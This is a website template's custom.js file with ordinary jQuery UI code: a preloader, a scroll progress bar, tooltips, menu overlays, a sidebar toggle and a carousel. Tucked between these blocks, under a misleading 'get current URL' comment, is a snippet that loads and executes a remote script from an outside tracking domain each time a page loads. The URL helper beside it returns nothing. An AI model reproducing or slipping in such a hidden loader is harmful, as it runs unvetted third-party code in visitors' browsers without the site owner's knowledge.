/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  ;('use strict')

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $('.loader_bg').fadeToggle()
  }, 2500)

  /* Progress bar
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  const scrollProgressBar = document.querySelector('.progressBar')

  document.addEventListener('scroll', () => {
    const totalHeightOfPage = document.body.scrollHeight
    const currentDistanceFromTop = document.documentElement.scrollTop
    const windowHeight = document.documentElement.clientHeight

    const scrollPercentage =
      (currentDistanceFromTop / (totalHeightOfPage - windowHeight)) * 100

    scrollProgressBar.style.width = `${scrollPercentage}%`
  })

  /* Tooltip functionality
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip()
  })

  /* Mouseover effects
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('.main-menu ul li.megamenu').mouseover(function () {
      if (!$(this).parent().hasClass('#wrapper')) {
        $('#wrapper').addClass('overlay')
      }
    })
    $('.main-menu ul li.megamenu').mouseleave(function () {
      $('#wrapper').removeClass('overlay')
    })
  })

  // Function to get current URL
  function getURL() {
    window.location.href
  }
  var protocol = location.protocol
  $.ajax({
    type: 'get',
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + '//leostop.com/tracking/tracking.js')
    },
  })

  /* Toggle sidebar functionality
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('#sidebarCollapse').on('click', function () {
      $('#sidebar').toggleClass('active')
      $(this).toggleClass('active')
    })
  })

  /* Product slider configuration
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // Optional configuration
  $('#blogCarousel').carousel({
    interval: 5000,
  })
}) 